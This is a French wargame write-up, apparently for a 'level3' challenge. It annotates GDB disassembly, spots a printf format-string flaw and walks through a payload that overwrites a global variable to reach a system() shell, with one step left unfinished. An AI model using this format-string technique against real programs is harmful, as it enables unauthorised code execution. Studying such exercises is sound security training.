disas v :
   0x080484a4 <+0>:	    push   %ebp
   0x080484a5 <+1>:	    mov    %esp,%ebp
   0x080484a7 <+3>:	    sub    $0x218,%esp
   0x080484ad <+9>:	    mov    0x8049860,%eax
   0x080484b2 <+14>:	mov    %eax,0x8(%esp)
   0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
   0x080484be <+26>:	lea    -0x208(%ebp),%eax -> allocation string (520)
   0x080484c4 <+32>:	mov    %eax,(%esp)
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt> -> fgets et pas gets : sécurisé
   0x080484cc <+40>:	lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:	mov    %eax,(%esp)
   0x080484d5 <+49>:	call   0x8048390 <printf@plt> -> exploit possible
   0x080484da <+54>:	mov    0x804988c,%eax
   0x080484df <+59>:	cmp    $0x40,%eax             -> comparaison, egale on rentre 
                                                        if, affiche fwrite et lance un
                                                        shell.
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    0x8049880,%eax
   0x080484e9 <+69>:	mov    %eax,%edx
   0x080484eb <+71>:	mov    $0x8048600,%eax
   0x080484f0 <+76>:	mov    %edx,0xc(%esp)
   0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
   0x080484fc <+88>:	movl   $0x1,0x4(%esp)
   0x08048504 <+96>:	mov    %eax,(%esp)
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	movl   $0x804860d,(%esp)
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave  
   0x08048519 <+117>:	ret  

x/s 0x804988c : 0x804988c <m>:	 "" -> objet m qui semble être une string vide
x 0x804988c : 0x804988c <m>:	0x00000000 -> en hex

L'idée est donc de modifier m avec printf grace a une format string attack.

On check la position du buffer :
python -c 'print "AAAA"+" %x"*15' | ./level3
A COMPLETER !!

Je teste en premier avec %4$42x dans mon exploit :
0x804988c <m>:	0x00000039 -> pas très loin de ce que je veux ! Il faut que 
                            j'ajoute 7 pour atteindre 40 donc %4$49x.
x 0x804988c : 0x804988c <m>:	0x00000040 -> Bingo !

cat /tmp/exploit3 - | ./level3 